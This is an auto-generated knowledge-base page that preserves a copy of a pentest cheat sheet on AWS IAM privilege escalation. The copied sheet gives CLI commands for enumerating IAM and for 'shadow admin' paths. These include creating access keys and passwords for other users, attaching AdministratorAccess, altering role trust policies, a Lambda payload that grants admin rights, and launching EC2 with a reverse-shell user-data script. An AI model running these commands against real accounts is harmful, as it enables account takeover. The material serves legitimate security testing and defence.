---
parsed_by: focuslocust
source: internalallthethings
type: generated
---
# AWS - Identity & Access Management

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `internalallthethings` |
| Type | `internal-topic` |
| Record ID | `iatt-cloud-aws-aws-iam` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-iam.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [AWS - Identity & Access Management](../../topics/cloud/aws-identity-and-access-management.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | iatt-cloud-aws-aws-iam |
| name | AWS - Identity & Access Management |
| type | internal-topic |
| source | internalallthethings |
| url | https://github.com/swisskyrepo/InternalAllTheThings/blob/main/docs/cloud/aws/aws-iam.md |

## Preserved Source Material

````yaml
_body: "# AWS - Identity & Access Management\n\n## Listing IAM access Keys\n\n```ps1\naws iam list-access-keys\n```\n\n##\
  \ Listing IAM Users and Groups\n\n```ps1\naws iam list-users\naws iam list-groups\n```\n\n## Get IAM Details\n\n```ps1\n\
  aws iam get-account-authorization-details > iam.json\n```\n\n## Assume a Specific Role\n\n```ps1\naws sts assume-role --role-arn\
  \ arn:aws:iam::${accountId}:role/${roleName} --role-session-name ${roleName}\n```\n\n## Login with MFA\n\nRetrieve the MFA\
  \ device ARN:\n\n```ps1\naws iam list-mfa-devices\n```\n\nThen create the session token:\n\n```ps1\naws sts get-session-token\
  \ --serial-number ${arnMFADevice} --token-code ${MFACode}\n```\n\n## Shadow Admin\n\n### Admin equivalent permission\n\n\
  - AdministratorAccess\n\n    ```powershell\n    \"Action\": \"*\"\n    \"Resource\": \"*\"\n    ```\n\n- **ec2:AssociateIamInstanceProfile**\
  \ : attach an IAM instance profile to an EC2 instance\n\n    ```powershell\n    aws ec2 associate-iam-instance-profile --iam-instance-profile\
  \ Name=admin-role --instance-id i-0123456789\n    ```\n\n- **iam:CreateAccessKey** : create a new access key to another\
  \ IAM admin account\n\n    ```powershell\n    aws iam create-access-key –user-name target_user\n    ```\n\n- **iam:CreateLoginProfile**\
  \ : add a new password-based login profile, set a new password for an entity and impersonate it\n\n    ```powershell\n \
  \   aws iam create-login-profile –user-name target_user –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\
  \\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^(' –no-password-reset-required\n    ```\n\n- **iam:UpdateLoginProfile**\
  \ : reset other IAM users’ login passwords.\n\n    ```powershell\n    aws iam update-login-profile –user-name target_user\
  \ –password '|[3rxYGGl3@`~68)O{,-$1B”zKejZZ.X1;6T}<XT5isoE=LB2L^G@{uK>f;/CQQeXSo>}th)KZ7v?\\\\hq.#@dh49″=fT;|,lyTKOLG7J[qH$LV5U<9`O~Z”,jJ[iT-D^('\
  \ –no-password-reset-required\n    ```\n\n- **iam:AttachUserPolicy**, **iam:AttachGroupPolicy** or **iam:AttachRolePolicy**\
  \ : attach existing admin policy to any other entity he currently possesses\n\n    ```powershell\n    aws iam attach-user-policy\
  \ –user-name my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n    aws iam attach-user-policy –user-name\
  \ my_username –policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n    aws iam attach-role-policy –role-name role_i_can_assume\
  \ –policy-arn arn:aws:iam::aws:policy/AdministratorAccess\n    ```\n\n- **iam:PutUserPolicy**, **iam:PutGroupPolicy** or\
  \ **iam:PutRolePolicy** : added inline policy will allow the attacker to grant additional privileges to previously compromised\
  \ entities.\n\n    ```powershell\n    aws iam put-user-policy –user-name my_username –policy-name my_inline_policy –policy-document\
  \ file://path/to/administrator/policy.json\n    ```\n\n- **iam:CreatePolicy** : add a stealthy admin policy\n- **iam:AddUserToGroup**\
  \ : add into the admin group of the organization.\n\n    ```powershell\n    aws iam add-user-to-group –group-name target_group\
  \ –user-name my_username\n    ```\n\n- **iam:UpdateAssumeRolePolicy** + **sts:AssumeRole** : change the assuming permissions\
  \ of a privileged role and then assume it with a non-privileged account.\n\n    ```powershell\n    aws iam update-assume-role-policy\
  \ –role-name role_i_can_assume –policy-document file://path/to/assume/role/policy.json\n    ```\n\n- **iam:CreatePolicyVersion**\
  \ & **iam:SetDefaultPolicyVersion** : change customer-managed policies and change a non-privileged entity to be a privileged\
  \ one.\n\n    ```powershell\n    aws iam create-policy-version –policy-arn target_policy_arn –policy-document file://path/to/administrator/policy.json\
  \ –set-as-default\n    aws iam set-default-policy-version –policy-arn target_policy_arn –version-id v2\n    ```\n\n- **lambda:UpdateFunctionCode**\
  \ : give an attacker access to the privileges associated with the Lambda service role that is attached to that function.\n\
  \n    ```powershell\n    aws lambda update-function-code –function-name target_function –zip-file fileb://my/lambda/code/zipped.zip\n\
  \    ```\n\n- **glue:UpdateDevEndpoint** : give an attacker access to the privileges associated with the role attached to\
  \ the specific Glue development endpoint.\n\n    ```powershell\n    aws glue –endpoint-name target_endpoint –public-key\
  \ file://path/to/my/public/ssh/key.pub\n    ```\n\n- **iam:PassRole** + **ec2:CreateInstanceProfile**/**ec2:AddRoleToInstanceProfile**\
  \ : an attacker could create a new privileged instance profile and attach it to a compromised EC2 instance that he possesses.\n\
  \n- **iam:PassRole** + **ec2:RunInstance** : give an attacker access to the set of permissions that the instance profile/role\
  \ has, which again could range from no privilege escalation to full administrator access of the AWS account.\n\n    ```powershell\n\
  \    # add ssh key\n    $ aws ec2 run-instances –image-id ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip\
  \ –key-name my_ssh_key –security-group-ids sg-123456\n    # execute a reverse shell\n    $ aws ec2 run-instances –image-id\
  \ ami-a4dc46db –instance-type t2.micro –iam-instance-profile Name=iam-full-access-ip –user-data file://script/with/reverse/shell.sh\n\
  \    ```\n\n- **iam:PassRole** + **lambda:CreateFunction** + **lambda:InvokeFunction** : give a user access to the privileges\
  \ associated with any Lambda service role that exists in the account.\n\n    ```powershell\n    aws lambda create-function\
  \ –function-name my_function –runtime python3.6 –role arn_of_lambda_role –handler lambda_function.lambda_handler –code file://my/python/code.py\n\
  \    aws lambda invoke –function-name my_function output.txt\n    ```\n\n    Example of code.py\n\n    ```python\n    import\
  \ boto3\n    def lambda_handler(event, context):\n        client = boto3.client('iam')\n        response = client.attach_user_policy(\n\
  \        UserName='my_username',\n        PolicyArn=\"arn:aws:iam::aws:policy/AdministratorAccess\"\n        )\n       \
  \ return response\n    ```\n\n- **iam:PassRole** + **glue:CreateDevEndpoint** : access to the privileges associated with\
  \ any Glue service role that exists in the account.\n\n    ```powershell\n    aws glue create-dev-endpoint –endpoint-name\
  \ my_dev_endpoint –role-arn arn_of_glue_service_role –public-key file://path/to/my/public/ssh/key.pub\n    ```\n\n## References\n\
  \n- [Cloud Shadow Admin Threat 10 Permissions Protect - CyberArk](https://www.cyberark.com/threat-research-blog/cloud-shadow-admin-threat-10-permissions-protect/)"
_relative_path: cloud/aws/aws-iam.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/internalallthethings/docs/cloud/aws/aws-iam.md
````
